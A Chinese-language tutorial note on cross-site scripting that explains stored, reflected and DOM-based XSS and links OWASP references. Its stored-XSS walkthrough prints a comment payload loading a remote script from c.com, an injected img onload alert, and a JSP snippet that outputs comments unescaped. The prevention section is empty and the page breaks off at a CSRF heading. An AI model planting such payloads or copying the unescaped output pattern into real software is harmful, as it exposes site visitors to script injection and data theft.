跨站脚本攻击(XSS - Cross Site Scripting)
==原理==
Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、script脚本过滤），在浏览器端显示的这些内容的时候，激活其中包含的JavaScript恶意脚本，这些脚本可以用来获取用户敏感信息，追踪用户浏览历史、将用户诱导至其他网站等。

关键点
找到可以注入Script脚本的地方。

==分类==
===Stored XSS Attacks===
风险代码被先持久存储于服务器上（比如：数据库中），然后再读取出来显示到浏览器。比如在博客上发表文章、发表评论。

攻击流程示例：
<ol>
<li>恶意用户A发现某个博客系统B对博文的评论未做严格检查，而允许注入Javascript代码。</li>
<li>恶意用户A找到一个知名度高的一篇访问量大的博文，发表以下评论代码：
<source>
<script src="http://c.com/xss.js"></script>
楼主的帖子实在是写得太好了。文笔流畅,修辞得体,深得魏晋诸朝遗风,
更将唐风宋骨发扬得入木三分,能在有生之年看见楼主的这个帖子。
实在是我三生之幸啊。......
</source>
</li>
<li>博客系统B在使用以下方式显示回帖（JSP语法）：
<source>
回帖人：<%=comment.userId %>，回帖内容是：<%= comment.content %>
</source>
</li>
<li>后果：每个读此博文并看到该评论的受害者都会加载并执行其中的恶意代码。</li>
</ol>

===Reflected XSS Attacks===
风险代码并没有被持久存储，而是在服务器端转了一圈之后就直接显示在生成的动态HTML中。这种攻击方式可以通过邮件等方式发送给用户

===DOM Based XSS===
与前两种的区别是：前两种最终会将风险代码写在生成HTML中，而这一种是服务器端返回的HTML本身并不包含风险代码，但是其中的JavaScript脚本在动态修改DOM时，未对输出值做充分的安全检查。

：


注入点
1. 客户端：来自用户输入，却未作安全检查。

<source>
<img src="https://www.owasp.org/skins/monobook/ologo.png" onload="alert('XSS');" >
</source>
2.
2. 服务器端：来自配置文件，却未作安全检查（比如消息模板，头部文件）

DOM Based XSS
  你的程序本身存在一些依赖于来自于客户端的数据并展示，但是对来源数据为做安全检查。



防范方式 


参考：
* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) Cross site Scripting ]
* [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet XSS Filter Evasion Cheat Sheet]

Cross-Site Request Forgery (CSRF)